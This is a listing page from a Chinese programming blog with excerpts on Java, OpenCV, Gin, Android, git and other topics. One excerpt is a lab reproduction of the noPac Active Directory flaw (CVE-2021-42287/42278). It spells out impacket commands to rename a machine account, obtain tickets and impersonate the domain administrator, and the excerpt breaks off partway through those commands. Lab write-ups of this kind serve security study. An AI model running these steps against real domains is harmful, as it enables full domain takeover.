<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8a57553015680af7aec209cd284497f/" rel="bookmark">
			Java 泛型进阶
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		接上文java 泛型简介
https://blog.csdn.net/nvd11/article/details/29391263
1. 泛型类 1.1 泛型类的定义语法 class 类名&lt;泛型标识， 泛型标识..&gt;{ private 泛型标识 变量名; ... } 例子：
/** * * @param &lt;T&gt; Generic Identification - Type formal parameter * T the type of the specified object when the object is created. */ @Slf4j public class Shooter&lt;T&gt; { /** * T, will be specified by outer class/object */ private T target; public void setTarget(T target){ this.target = target; } public T getTarget(){ return this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d8a57553015680af7aec209cd284497f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a4a9787430a4900a72f470f789888b9f/" rel="bookmark">
			补码乘法运算
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		补码的乘法运算 补码最后一次再多来一次加法为了：使符号位参与运算
补码采用双符号位，00表示正号，11表示负号
01表示上溢，10表示下溢
题目 2.2.7 10
循环移位
2.2.7 10
算术移位的对象是带符号数，在移动过程中符号位不变
逻辑移位的对象是无符号数
2.2.7 15
2.2.7 24
2.2.7 26
补码不恢复余数除法中，同号相除时，够减商1，不够减商0
2.2.7 27
2.2.7 34
2.2.7 35
2.2.7 38
2.2.7 39
2.2.7 41
2.2.7 43
选D
2.2.7 45
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a546eadaa8674c89451b898fac525d19/" rel="bookmark">
			nopac 原理及复现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		nopac 复现 CVE-2021-42287/CVE-2021-42278 ​ CVE-2021-42287/CVE-2021-42278该漏洞被命名为 saMAccountName spoofing 漏洞。该漏洞允许攻击者在仅有一个普通域账号的场景下，利用该漏洞接管全域。
原理 ​ 在Kerberos认证的过程中，处理UserName字段时，如果找不找不到UserName字段（这里的UserName字段可以理解为samAccountName的值），KDC就会去查找UserName$。但是在Kerberos认证中负责用户身份权限的数据块是PAC，正常流程下在TGS阶段的PAC是拷贝AS阶段的（如果是修改samAccountName值的域用户去申请的PAC，在TGS阶段去申请ST时的PAC还是之前用户的，是没有办法成功利用的），所以这里就需要利用到S4U2Self请求，利用S4U2Self的特性，在TGS阶段的时候会根据S4U2Self协议中模拟的用户生成对应的PAC（绕过了TGS阶段的PAC是拷贝AS阶段的校验），放在ST票据中，即可拿着该ST去访问域控。
利用方法 ​ 在拥有一个域用户账号密码的情况下，通过修改samAccountName属性为域控机器名，使用该用户去申请一张带有Pac的tgt，在将该用户的samAccountName属性修改成原来的值(或者其他的都可以)，最后再利用S4U2Self协议去请求访问域控制器获取该服务的ST票据。
复现1 攻击流程 创建一个机器账户，可以使用impacket中的addcomputer.py或者是pwermad（addcomputer.py利用的是SAMR协议创建机器账户，创建好的机器账户没有注册SPN的，所以可以不用清除SPN） 使用pwermad则需要清除servicePrincipalName属性 将机器账户的sAMAccountName更改为DC的机器名使用机器账户向域控请求TGT将机器账户的sAMAccountName还原或者修改成其他名称通过S4U2self协议向域控请求STDCsync 使用impacket中的addcomputer.py 创建一个机器用户
python3 addcomputer.py -computer-name '9z1nc' -computer-pass '9z1nc' -dc-ip 192.168.3.21 'god.com/mary:admin!@#45' -method SAMR -debug 将机器账户9z1nc$的sAMAccountName更改为DC的机器名（OWA2010CN-GOD）
这里有个错误应该是将创建的9z1nc$改成OWA2010CN-GOD,下面的演示都是改回来了的，就不贴图了
python3 renameMachine.py -current-name '9z1nc$' -new-name 'OWA2010CN-god' -dc-ip 192.168.3.21 'god.com/mary:admin!@#45' renameMachine.py
https://gist.githubusercontent.com/snovvcrash/3bf1a771ea6b376d374facffa9e43383/raw/d4191e295c96bc1cfb0a54b18cfbb8b21d25b483/renameMachine.py 上面该错的地方 将OWA2010CN修改成OWA2010CN-GOD（OWA2010CN-GOD才是域控主机名）
使用机器账户OWA2010CN-GOD向域控请求TGT，在当前路径下生成OWA2010CN-god.ccache票据
getTGT.py -dc-ip '192.168.3.21' 'god.org'/'OWA2010CN-god':'9z1nc' 将机器账户的sAMAccountName还原或者修改成其他名称
python3 renameMachine.py -current-name 'OWA2010CN-God' -new-name '9z1nc$' -dc-ip 192.168.3.21 'god.com/mary:admin!@#45' 利用getST.py 通过S4U2self协议向域控请求ST(这里getST.py一直报错，暂时没找到解决办法换了一个工具)
export KRB5CCNAME=/root/impacket-0.9.24/examples/OWA2010CN-god.ccache getST.py -self -impersonate 'administrator' -altservice 'CIFS/OWA2010CN-God.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a546eadaa8674c89451b898fac525d19/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70c361119d33a90255a61faa1c5b1f5b/" rel="bookmark">
			vscode 修改 c&#43;&#43;11
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这里单纯的作为记录问题的所在
c++添加了很多新的特性，比如对于vector不能使用中括号初始化以及auto关键字，以为萌新，还在发现c++11的新特性
c++11在vscode修改我们需要修改几个配置：
第一步：
打开c++ 添加扩展设置
找到compilerArgs配置
添加c++11的配置：
"C_Cpp.default.compilerArgs": [ "-g", "${file}", "-std=c++11", "-o", "${fileDirname}/${fileBasenameNoExtension}" ] 设置完以后我们在项目文件夹内找到配置文件：c_cpp_properties.json
修改：
“cStandard”: “c11”,
“cppStandard”: “c++11”
{ "configurations": [ { "name": "Mac", "defines": [], "macFrameworkPath": [ "/System/Library/Frameworks", "/Library/Frameworks", "${workspaceFolder}/**" ], "compilerPath": "/usr/bin/g++", "cStandard": "c11", "cppStandard": "c++11", "intelliSenseMode": "clang-x64", "browse": { "path": [ "${workspaceFolder}" ], "limitSymbolsToIncludedHeaders": true, "databaseFilename": "" } } ], "version": 4 } 接下来修改tasks.json文件夹下的args属性：
"args": [ "-std=c++11", "-stdlib=libc++", "-fdiagnostics-color=always", "-g", "${file}", "${workspaceFolder}/test.cpp", "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/70c361119d33a90255a61faa1c5b1f5b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f99dca78749f31dac7f6fff3a7c488fb/" rel="bookmark">
			计算机视觉入门（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.图片的读取
cv2.IMREAD_COLOR：彩色图像
cv2.IMREAD_GRAYSCALE：灰度图像
imgs=cv2.imread("dog.jpg") imgs=cv2.cvtColor(imgs,cv2.COLOR_BGR2RGB) print(imgs) plt.imshow(imgs) plt.show() 2.视频中读取图片
cv2.VideoCapture可以捕获摄像头，用数字来控制不同的设备
vc=cv2.VideoCapture("E:\\Pec\\ved.mp4") #检测是否能打开 if vc.isOpened(): open,frame=vc.read() #一帧一帧的读取 else: open=False #读取视频，并转换为灰度视频 while open: ret,frame=vc.read() if frame is None: break if ret==True: gray=cv2.cvtColor(frame,cv.COLOR_BGR2GRAY) cv2.imshow('result',gray) if cv2.waitKey(10) &amp; 0xFF==27: break vc.release() cv.destroyAllWindows() 3.截取图片的部分范围
#截取部分图像数据(ROI) img=cv2.imread('cat.jpg') #截取自己想要的切片 imgs=img[100:300,0:200] plt.imshow(imgs) plt.show() 4.分离颜色通道
#颜色通道提取 img=cv2.imread('dog.jpg') b,g,r=cv2.split(img) print(r.shape) #将分离的颜色通道再组合 img=cv2.merge((b,g,r)) print(img.shape) #只保留R通道 cur_img=img.copy() cur_img[:,:,0]=0 #取所有区域，把B设置0 cur_img[:,:,1]=0 #取所有区域，把G设置0 plt.imshow(cur_img) plt.show() #只保留G通道 cur_img=img.copy() cur_img[:,:,0]=0 cur_img[:,:,2]=0 plt.imshow(cur_img) plt.show() #只保留B通道 cur_img=img.copy() cur_img[:,:,1]=0 cur_img[:,:,2]=0 plt.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f99dca78749f31dac7f6fff3a7c488fb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/953c19fdfd38a952b7d9cb542d9e8740/" rel="bookmark">
			Go语言下的Gin详解及Demo实践
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Go语言下的Gin详解及Demo实践 今天没有去继续更新开源10年的项目，因为昨天接触到几个新的知识点，所以今天加强一下对他们的认识，下面是本节的一个知识点。
1）Gin Web框架的认识
2）Gin加载静态资源
3）Gin加载动态资源
在学习Gin的过程中动手搞了一个小Demo，把Gin的简单用发都跑了一下，强烈建议各位读者不要只看文章，自己动手写一下效果更佳。
项目在GitHub上的地址：https://github.com/kaiyuan10nian/GinDemo
下面开始我们今天的知识点分享。
一、创建一个Go web项目，这里我命名为：GinDemo，方便我们的学习。
项目结构
Gin安装：go get -u http://github.com/gin-gonic/gin
直接在Goland下面的Terminal中输入就可以了。看到下图就表示你安装成功了
二、先写一个小案例，并在Postman或者浏览器中打开看下效果。
在GinDemo下面创建一个main.go文件，输入以下内容：
然后在下面的Termonal中输入以下指令运行该项目：
Go run main.go
看到下图即表示你已经运行起来了。
这个时候，打开你的浏览器，输入：localhost:8080/ping,将显示以下内容：
整个Demo中的注释还是比较清楚的，每一行代码是什么意思，有什么作用等都比较简单，运行到这里基本上Gin的精髓就已经学到了。
下面两个知识点是可以解决我们在真正的实际项目中经常会遇到的需求的。所以我这里单独拉了出来写一下。当然，它还有其它别的更多用法，我们就不一一说了，至少掌握了这两个对于普通的开发工作就足以应对了。
三、加载静态资源
在实际项目中我们经常会用到很多静态资源，比如：图片、文件等。那Gin是怎么处理的呢？还是看案例，下面我们对上面的main.go进行一下简单修改：
主要加了两行代码，用到两个函数。注释中已经描述的很清楚了，说一下代码中未描述的内容，非常重要，这两个函数的第一个参数就是相对地址，也就是说是用户端访问的时候访问的地址，第二个参数是本地服务器的地址，也就是引用的地址。
比如我们运行上面项目后，若想访问/Users/fu/GolandProjects/GinDemo/web/static里面的图片，那么直接如下操作即可：
若想加载第二种加载形式的，则直接这么访问：
其实，这两种访问形式访问的都是同一张图片。
这就是静态加载资源的方式方法，那么我们做一个web站点肯定不是仅仅有静态资源，肯定还有动态资源，动态资源的加载怎么实现？
四、加载动态资源
首先，在GinDemo-web下新建templete并在其中新增一个index.html文件，文件内容很简单，这里制作演示所以就没有去做接口互动。
然后，在根目录下创建了controller文件夹并创建con.go，主要用来存放逻辑层的操作，受JAVA开发的影响我这么去做了，你可以随意哈，怎么高兴怎么来。
还是在main.go中做修改,并加载trmplete下面的资源，然后做了一个web分组，分组中仅有一个接口，其处理放到了con.go文件中的IndexController函数中。
直接运行，然后浏览器中访问index.html看看有什么效果？
到这里，其实这个项目就算完成了，其中涉及到的知识点我们也都了解了，就这些内容已经完全够现阶段的我们使用了。
拜拜。。。See you next.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/536bf4983e502056aa6ea2f891d8eef4/" rel="bookmark">
			下载redis，Windows10子系统Ubuntu登录密码失效？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 问题：之从给Windows10装了子系统后，很久没用，打开cmd---&gt;wsl进入Linux系统，因为项目需要用到redis，官网上说 要在Windows上安装Redis，首先需要启用WSL2（Windows Subsystem for Linux）
进入wsl后进行下载操作后，需要输入用户密码，因为Ubuntu刚下载时，设置了新的用户名和密码，然后我发现我输入密码后，系统连续三次输入报错，无法进行任何操作。
原因：可能是修改用户名后，密码失效。
解决办法：总体概括就是在root权限下重新设置用户密码，例如：我的用户名是huchuancan，然后操作如下：
关闭Ubuntu窗口打开Powershell 或 cmd， 以root默认登陆 wsl -u root。别关，在这个cmd窗口内（重点）输入 wsl 进入，输入 passwd your_username ，确认密码。关闭 WSL。 exit 修改密码成功后，根据官网指令下载redis
sudo apt-get update sudo apt-get install redis 开启redis服务
sudo service redis-server start 通过连接Redis CLI来测试Redis服务器是否正在运行
redis-cli 127.0.0.1:6379&gt; ping PONG 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/32172a9bd4b7f97d40198fa35ffdc387/" rel="bookmark">
			Nordic 中心设备添加自定义服务处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Nordic 中心设备添加自定义服务处理 照搬ble_nus_c.c和ble_nus_c.h内容来完成自定义服务的处理。这里中心设备我采用的工程例子是 ble_app_uart_c。
将components\ble\ble_services\ble_nus_c中的 ble_nus_c.c和ble_nus_c.h 拷贝到我们的工程中。
修改文件名，避免文件重定义问题。然后就是依样画葫芦，照着 ble_nus_c.c 和 ble_nus_c.h 进行修改。
这里修改好的文件我放在 github上。
这里直接把所有的nus名字换成我们自定义的。
uuid 也换成自定义的，这里的三个 uuid 需要是连续的。
#define MYSERVICE_BASE_UUID {{0x66, 0xCA, 0xDC, 0x24, 0x0E, 0xE5, 0xA9, 0xE0, 0x93, 0xF3, 0xA3, 0xB5, 0x00, 0x00, 0x40, 0x6E}} /**&lt; Used vendor-specific UUID. */ #define BLE_UUID_MYSERVICE_SERVICE 0x2221 /**&lt; The UUID of the Nordic UART Service. */ #define BLE_UUID_MYSERVICE_RX_CHARACTERISTIC 0X2222 /**&lt; The UUID of the RX Characteristic. */ #define BLE_UUID_MYSERVICE_TX_CHARACTERISTIC 0x2223 /**&lt; The UUID of the TX Characteristic.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/32172a9bd4b7f97d40198fa35ffdc387/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/16964824434575f62caaa10e49b43b60/" rel="bookmark">
			Android开发面经4
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、JNI JNI详解
JNI面试题
Android JNI开发步骤(借助于NDK)？ Android为了便于开发人员调用C、C++等本地代码，为我们封装了一层接口，也就是JNI(Java Native Interface Java本地接口)，我们都知道Java是跨平台语言，正是因为跨平台导致了Java程序在和本地交互的时候出现了短板，使得他与本地代码的交互能力不是 很强，于是Java为我们提供了JNI来专门和本地代码来进行交互，具体到Android中，为我们提供了NDK来方便的通过JNI访问本地代码，接下来 我们简单描述下通过NDK开发JNI的流程， 先来说说通过JNI调用本地代码的原理：
(1)：我们把C/C++源程序编译打包成动态库(dll或者so)，存放在我们项目中的lib目录下；
(2)：在java程序中我们调用带native修饰的方法，他的具体实现是在C/C++程序中的，系统会调用动态库中相应的实现方法，如果有需要的话，还会返回处理结果； 开发步骤：
(1)：首先创建一个Android工程，和我们平常创建没什么区别；
(2)：添加本地动态库支持，具体就是右击刚刚创建的Android项目，找到Android Tools，接着找到Android Tools中的Add Native Support，然后输入动态库的名称(系统会为我们自动加上前缀"lib"和后缀"so"的)，创建完成之后会在项目中生成一个jni的目录，目录里面 会有一个.cpp以及Android.mk文件；
(3)：创建两个文件，一个是java源文件，这个文件中其实就是对native方法的声明而已，我们称之为代理动态库方法；另一个是C/C++源文件， 是对代理方法的实现；首先对于Java代理文件，静态导入动态库，并编写好代理方法，然后利用javah命令生成C语言的方法签名，接着复制方法签名到 C/C++源文件中，补充参数名和方法体就可以了；
(4)：接着我们需要完成C/C++源文件的方法体内容，也就是我们具体的业务逻辑操作部分了；
(5)：最后就是在我们的程序中调用native方法来调用C/C++代码了；
2、Android常见动画和UI效果 事件分发机制？ 首先应该搞清楚两个问题：事件分发机制分发的是什么？怎么进行分发？
分发的是MotionEvent事件了，因而我们讨论的问题就成了当MotionEvent事件生成之后，事件是怎么传递到某一个View控件上面并且得到处理的过程；
android事件产生后的传递过程是从Activity—&gt;Window—&gt;View的，即隧道式传递，而View又分为不包含子 View的View以及包含子View的ViewGroup，事件产生之后首先传递到Activity上面，而Activity接着会传递到 PhoneWindow上，PhoneWindow会传递给RootView，而RootView其实就是DecorView了，接下来便是从 DecorView到View上的分发过程了，具体就可以分成ViewGroup和View的分发两种情况了；
对于ViewGroup而言，当事件分发到当前ViewGroup上面的时候，首先会调用他的dispatchTouchEvent方法，在 dispatchTouchEvent方法里面会调用onInterceptTouchEvent来判断是否要拦截当前事件，如果要拦截的话，就会调用 ViewGroup自己的onTouchEvent方法了，如果onInterceptTouchEvent返回false的话表示不拦截当前事件，那么 事件将会继续往当前ViewGroup的子View上面传递了，如果他的子View是ViewGroup的话，则重复ViewGroup事件分发过程，如 果子View就是View的话，则转到下面的View分发过程；对于View而言，事件传递过来首先当然也是执行他的dispatchTouchEvent方法了，如果我们为当前View设置了 onTouchListener监听器的话，首先就会执行他的回调方法onTouch了，这个方法的返回值将决定事件是否要继续传递下去了，如果返回 false的话，表示事件没有被消费，还会继续传递下去，如果返回true的话，表示事件已经被消费了，不再需要向下传递了；如果返回false，那么将 会执行当前View的onTouchEvent方法，如果我们为当前View设置了onLongClickListener监听器的话，则首先会执行他的 回调方法onLongClick，和onTouch方法类似，如果该方法返回true表示事件被消费，不会继续向下传递，返回false的话，事件会继续 向下传递，为了分析，我们假定返回false，如果我们设置了onClickListener监听器的话，则会执行他的回调方法onClick，该方法是 没有返回值的，所以也是我们事件分发机制中最后执行的方法了；可以注意到的一点就是只要你的当前View是clickable或者 longclickable的，View的onTouchEvent方法默认都会返回true，也就是说对于事件传递到View上来说，系统默认是由 View来消费事件的，但是ViewGroup就不是这样了；上面的事件分发过程只是正常情况下的，如果有这样一种情况，比如事件传递到最里层的View之后，调用该View的oonTouchEvent方法返回了 false，那么这时候事件将通过冒泡式的方式向他的父View传递，调用它父View的onTouchEvent方法，如果正好他的父View的 onTouchEvent方法也返回false的话，这个时候事件最终将会传递到Activity的onTouchEvent方法了，也就是最终就只能由 Activity自己来处理了； 事件分发机制需要注意的几点：
(1)：如果说除Activity之外的View都没有消费掉DOWN事件的话，那么事件将不再会传递到Activity里面的子View了，将直接由Activity自己调用自己的onTouchEvent方法来处理了；
(2)：一旦一个ViewGroup决定拦截事件，那么这个事件序列剩余的部分将不再会由该ViewGroup的子View去处理了，即事件将在此 ViewGroup层停止向下传递，同时随后的事件序列将不再会调用onInterceptTouchEvent方法了；
(3)：如果一个View开始处理事件但是没有消费掉DOWN事件，那么这个事件序列随后的事件将不再由该View来处理，通俗点讲就是你自己没能力就别瞎BB，要不以后的事件就都不给你了；
(4)：View的onTouchEvent方法是否执行是和他的onTouchListener回调方法onTouch的返回值息息相关 的，onTouch返回false，onTouchEvent方法不执行；onTouch返回false，onTouchEvent方法执行，因为 onTouchEvent里面会执行onClick，所以造成了onClick是否执行和onTouch的返回值有了关系；
View视图绘制过程原理？ View视图绘制需要搞清楚两个问题，一个是从哪里开始绘制，一个是怎么绘制？
先说从哪里开始绘制的问题：我们平常在使用Activity的时候，都会调用setContentView来设置布局文件，没错，视图绘制就是从这个方法开始的；再来说说怎么绘制的：
在我们的Activity中调用了setContentView之后，会转而执行PhoneWindow的setContentView，在这个方法里面 会判断我们存放内容的ViewGroup(这个ViewGroup可以是DecorView也可以是DecorView的子View)是否存在。不存在的 话则会创建一个DecorView出来，并且会创建出相应的窗体风格，存在的话则会删除原先ViewGroup上面已有的View，接着会调用 LayoutInflater的inflate方法以pull解析的方式将当前布局文件中存在的View通过addView的方式添加到 ViewGroup上面来，接着在addView方法里面就会执行我们常见的invalidate方法了，这个方法不只是在View视图绘制的过程中经常 用到，其实动画的实现原理也是不断的调用这个方法来实现视图不断重绘的，执行这个方法的时候会调用他的父View的invalidateChild方法， 这个方法是属于ViewParent的，ViewGroup以及ViewRootImpl中都对他进行了实现，invalidateChild里 面主要做的事就是通过do while循环一层一层计算出当前View的四个点所对应的矩阵在ViewRoot中所对应的位置，那么有了这个矩阵的位置之后最终都会执行到 ViewRootImpl的invalidateChildInParent方法，执行这个方法的时候首先会检查当前线程是不是主线程，因为我们要开始准 备更新UI了，不是主线程的话是不允许更新UI的，接着就会执行scheduleTraversals方法了，这个方法会通过handler来执行 doTraversal方法，在这个方法里面就见到了我们平常所熟悉的View视图绘制的起点方法performTraversals了；那么接下来就是真正的视图绘制流程了，大体上讲View的绘制经历了Measure测量、Layout布局以及Draw绘制三个过程，具体来讲是从 ViewRootImpl的performTraversals方法开始，首先执行的将是performMeasure方法，这个方法里面会传入两个 MeasureSpec类型的参数，他在很大程度上决定了View的尺寸规格，对于DecorView来说宽高的MeasureSpec值的获取与窗口尺 寸以及自身的LayoutParams有关，对于普通View来说其宽高的MeasureSpec值的获取由父容器以及自身的LayoutParams属 性共同决定，在performMeasure里面会执行measure方法，在measure方法里面会执行onMeasure方法，到这里 Measure测量过程对View与ViewGroup来说是没有区别的，但是从onMeasure开始两者有差别了，因为View本身已经不存在子 View了，所以他onMeasure方法将执行setMeasuredDimension方法，该方法会设置View的测量值，但是对于 ViewGroup来说，因为它里面还存在着子View，那么我们就需要继续测量它里面的子View了，调用的方法是measureChild方法，该方 法内部又会执行measure方法，而measure方法转而又会执行onMeasure方法，这样不断的递归进行下去，知道整个View树测量结束，这 样performMeasure方法执行结束了；接着便是执行performLayout方法了，performMeasure只是测量出View树中 View的大小了，但是还不知道View的位置，所以也就出现了performLayout方法了，performLayout方法首先会执行 layout方法，以确定View自身的位置，如果当前View是ViewGroup的话，则会执行onLayout方法。在onLayout方法里面又 会递归的执行layout方法，直到当前遍历到的View不再是ViewGroup为止，这样整个layout布局过程就结束了；在View树中View 的大小以及位置都确定之后，接下来就是真正的绘制View显示在界面的过程了，该过程首先从performDraw方法开始，performDraw方法 首先执行draw方法，在draw方法中首先绘制背景、接着调用onDraw方法绘制自己，如果当前View是ViewGroup的话，还要调用 dispatchDraw方法绘制当前ViewGroup的子View，而dispatchDraw方法里面实际上是通过drawChild方法间接调用 draw方法形成递归绘制整个View树，直到当前View不再是ViewGroup为止，这样整个View的绘制过程就结束了； 解决滑动冲突的方式？ 在自定义View的过程经常会遇到滑动冲突问题，一般滑动冲突的类型有三种：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/16964824434575f62caaa10e49b43b60/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99f037691190d8a2cf1fe0754c1edd8d/" rel="bookmark">
			git：理解工作区，暂存区和本地仓库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言 为了理解指令 git ls-files ，学习了 git 的三大概念：工作区，暂存区 和本地仓库。当理解这三个概念以后，建议去学习一下git：文件存储方式，它告诉了我们在上述三个阶段中，项目文件是以什么格式被存储，文件格式之间的关联，以及版本切换和分支切换的底层原理。
工作区：work-tree 就是你本地的工作目录，git 相关的文件全部保存在 .git 目录下。
暂存区：index / staging area / cache 当运行指令 git add 时，git 将需要跟踪的文件（不包括目录信息）复制并压缩成 blob 对象进行保存。当对同一个文件进行修改后，执行 add 指令会生成一个新的 blob。只有工作区和本地仓库也能进行版本管理（例如 Mercurial），git 引入 index 的目的是为了缓解 merge 冲突，这里暂不讨论。
本地仓库：repository repository（repo）由 commits ，tree 和 blob 组成。当 commit 用作名词时，指 git 版本历史中的某一个版本；用作指令时，指生成当前版本的 commit，tree，并联合 index 中的 blob 一起保存到 repo 中，同时将 branch 指向最新的 commit（HEAD 指向当前的 branch，branch 指向 commit）。tree 保存的是其下 blob 和 tree 的地址，多个 tree 一起保存了整个版本的目录结构；commit 保存了一个 tree 和描述该版本的信息，该 tree 指向整个版本目录。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/99f037691190d8a2cf1fe0754c1edd8d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3cf02d1815ee20f7bfa5fc61368578a2/" rel="bookmark">
			数字 耳机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		自带dac（解码芯片）的是数字耳机，需要系统支持通过usb进行音频输出，但目前小米系统对此兼容性比较差，音质有好有坏，还有专门的数字音频转接头。
模拟耳机就是使用手机内部的解码芯片和耳放电路，兼容性更好，但是在小米这里有些机型底噪比较明显；
数字耳机会自带DAC和放大器，可播放超高码率的无损音乐，而手机只做数字信号输出和供电，由耳机直接来做解码和放大信号。
买数字耳机的五个理由：
理由一：音质的提升
我们现在使用的3.5mm耳机，音频信号从手机、播放器到耳机的发声过程，需要经过不断的转换和传输；但期间会对信号造成衰减和损失。而对于数字耳机来说，手机、播放器部分只负责将数字信号传输给耳机，DAC（数模转换）和放大部分则都在耳机里进行，整个过程有着很高效率和隔离度，信号几乎没有损失；而传输效率的提升本质的改变则是失真和底噪的减少，且这种改变是亲耳可闻的。
理由二：HiFi不再只属于器材党
目前市面上大部分智能手机最高仅支持16bit/44.1kHz音频格式，也就是传统CD采用的压缩格式；但在专业音频或发烧设备中，可以说不值一提。而数字耳机拥有高达96KHz（甚至更高）的采样率，可以支持像24bit/192kHz、DSD等更高码率的音频格式，满足那些对音质有高追求的用户。在智能随身设备上实现HiFi，未来将不再是难事。
理由三：即插即用
不论是DAC解码还是放大器芯片工作，都需要供电，但对于内置这些芯片的数字耳机来说，却不需要内置电池。基于iOS和安卓设备使用的USB Audio协议，允许其接口为数字设备直接供电。所以不仅是苹果，庞大的安卓阵营也已经为数字耳机的到来做好了准备。但目前来看，最大的问题是：手机直接给数字耳机供电会加速耗电。所以如何解决这个问题，将直接影响用户能否长时间使用数字耳机。
理由四：可玩性的扩展
其实和蓝牙设备相同，数字接口将为耳机设备带来更高的权限，Mic、线控等功能自然不在话下，并且还会有更多的功能出现在数字耳机上。拿Libratone新推出的lightning耳机来说，它配有专属APP，用户可以通过APP来实现降噪调节、声音模式切换等功能，满足用户的个人听音喜好。如果不使用APP，用户也可以通过线控来调节降噪和声音模式切换功能。所以在智能手机上，数字耳机未来的智能扩展性将是不可估量的。
理由五：好耳机不再难推
我们在使用传统耳机时，由于阻抗和灵敏度不同，经常会因为手机的驱动力不够而无法发挥出一款好耳机的声音优势。但这个问题在数字耳机上有望得到解决，在DAC和放大电路内置于耳机的状态下，用户可通过APP对耳机进行智能调节，来获得最佳的音质。同时，对于不同风格的音乐，也可根据个人喜好进行EQ调节。在数字耳机上，可能不再会出现手机推不出好音质的问题。
写在最后：
继飞利浦、索尼、先锋之后，Libratone也加入了Lightning耳机（数字耳机）市场。而即将发布的iPhone，很可能会成为引领耳机行业变革的产品。对于用户来说，现有的3.5mm耳机依旧可以使用，只是可能会多插上一个转接头，而数字耳机或将成为下一个浪潮。只是目前来看，如何说服消费者花更多的钱去买数字耳机，同时还要面临手机掉电快的尴尬，是摆在耳机厂商和手机厂商面前的主要问题。
魅族的一款数字耳机
https://blog.csdn.net/mike8825/article/details/84001000?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163894368216780274196136%2522%252C%2522scm%2522%253A%252220140713.130102334…%2522%257D&amp;request_id=163894368216780274196136&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2allsobaiduend~default-2-84001000.pc_search_es_clickV2&amp;utm_term=%E6%95%B0%E5%AD%97%E8%80%B3%E6%9C%BA&amp;spm=1018.2226.3001.4187
通过DAC听，是不经过手机的。
音乐文件的数字信号通过USB OTG传给外置DAC，外置DAC解码变成模拟信号驱动耳机
一句话 原本打杂的什么都做 后来因为做得不太好 所以请了个专业的来做一件事。
原本是由手机CPU来解码 接上去之后就是由dac解码
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3c588831ac5586eb74f9bc086979770c/" rel="bookmark">
			自适应辛普森（Simpson）积分
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		自适应辛普森（Simpson）积分 很多时候，我们会面临一些求积分的问题，无论是直接给你函数，让你想办法求解积分，还是对于一些计算几何问题，无法直接推导积分，我们都可以用这种方法来求一段区域的积分，积分的相关基础概念这里就不再赘述，今天主要就是说明他的大致原理，和他的用法。
